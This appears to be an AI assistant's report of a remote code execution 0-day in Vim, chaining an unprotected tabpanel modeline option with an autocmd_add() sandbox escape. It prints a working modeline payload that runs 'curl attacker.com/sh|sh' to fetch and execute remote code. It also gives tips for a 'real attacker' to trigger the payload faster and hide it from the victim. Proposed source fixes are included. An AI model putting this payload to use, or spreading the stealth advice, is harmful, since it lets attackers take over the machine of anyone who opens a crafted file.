● I found the RCE 0-day. Here's the complete vulnerability:

  ---
  Vim RCE 0-day: tabpanel modeline + autocmd_add() sandbox escape

  Root Cause (two bugs that chain together)

  Bug 1: tabpanel option missing P_MLE flag (src/optiondefs.h:2581)

  // tabpanel - NO P_MLE, NO P_SECURE, NO P_NO_ML
  {"tabpanel",  "tpl",    P_STRING|P_VI_DEF|P_RALL, ...}

  // Compare with statusline and tabline which HAVE P_MLE:
  {"statusline","stl",    P_STRING|P_VI_DEF|P_ALLOCED|P_RSTAT|P_MLE, ...}
  {"tabline",   "tal",    P_STRING|P_VI_DEF|P_RALL|P_MLE, ...}

  tabpanel is functionally identical to statusline/tabline - it evaluates
  %{expr} expressions via build_stl_str_hl_mline() (src/tabpanel.c:502-508). But
   it's missing the P_MLE flag, so it can be set from a modeline without needing
   modelineexpr enabled. (showtabpanel is similarly unprotected and defaults to
  0, but can be set via modeline to force the tab panel visible.)

  Bug 2: autocmd_add() has no sandbox check (src/autocmd.c:3316)

  void f_autocmd_add(typval_T *argvars, typval_T *rettv)
  {
      autocmd_add_or_delete(argvars, rettv, FALSE);  // no check_secure()!
  }

  The entire src/autocmd.c has zero calls to check_secure() or checks of the
  sandbox variable. While the :autocmd ex command is properly restricted (no
  EX_SBOXOK flag in src/ex_cmds.h:174), the autocmd_add() function completely
  bypasses this.

  Exploit Chain

  1. Attacker crafts a file with a modeline:
  vim: set showtabpanel=2
  tabpanel=%{autocmd_add([{'event':'CursorHold','pattern':'*','cmd':'!curl\
  attacker.com/sh\|sh','once':v:true}])}:
  2. Victim opens the file. Modeline processing:
    - showtabpanel=2 is allowed (no P_SECURE/P_NO_ML) → tab panel always shown
    - tabpanel=... is allowed (no P_MLE/P_SECURE/P_NO_ML) → expression set
    - Both get P_INSECURE flag (from src/option.c:3062-3064)
  3. Screen redraws, draw_tabpanel() → build_stl_str_hl_mline() evaluates the
  %{expr}. The expression runs inside the sandbox (because P_INSECURE was set →
  was_set_insecurely() returns true → use_sandbox=1 at src/buffer.c:4550).
  4. autocmd_add() is called from inside the sandbox. It succeeds because it
  never calls check_secure(). A CursorHold autocommand is registered.
  5. After updatetime ms of inactivity (~4 seconds), CursorHold fires outside 
  the sandbox → shell command executes → RCE.

  Fix

  Two changes needed:

  1. Add P_MLE to tabpanel in src/optiondefs.h:2581:
  {"tabpanel",  "tpl",    P_STRING|P_VI_DEF|P_RALL|P_MLE,
  2. Add check_secure() to autocmd_add() in src/autocmd.c:3316:
  void f_autocmd_add(typval_T *argvars, typval_T *rettv)
  {
      if (check_secure())
          return;
      autocmd_add_or_delete(argvars, rettv, FALSE);
  }
  2. (And similarly for f_autocmd_delete at line 3325.)

  How it works

  1. Victim opens the file in Vim (vim poc.c)
  2. Modeline processing sets showtabpanel=2 (force tab panel visible) and
  tabpanel=%{expr} — both pass validation since neither has
  P_MLE/P_SECURE/P_NO_ML
  3. Screen redraws → tab panel evaluates %{autocmd_add(...)}
  4. autocmd_add() runs inside the sandbox but has no check_secure() call →
  succeeds, registers a CursorHold autocommand
  5. After ~4 seconds of idle, CursorHold fires outside the sandbox →
  !id>/tmp/vim-rce-poc executes
  6. Verify: cat /tmp/vim-rce-poc shows the output of id

  Notes

  - The \: sequences in the modeline escape colons from the modeline parser
  (which uses : as a delimiter)
  - once flag ensures the autocmd auto-removes after firing (though it gets
  re-registered on each tabpanel redraw)
  - CursorHold fires after updatetime ms of inactivity (default 4000ms)
  - A real attacker could use CursorMoved for near-instant triggering, or use
  silent !cmd to suppress visual output
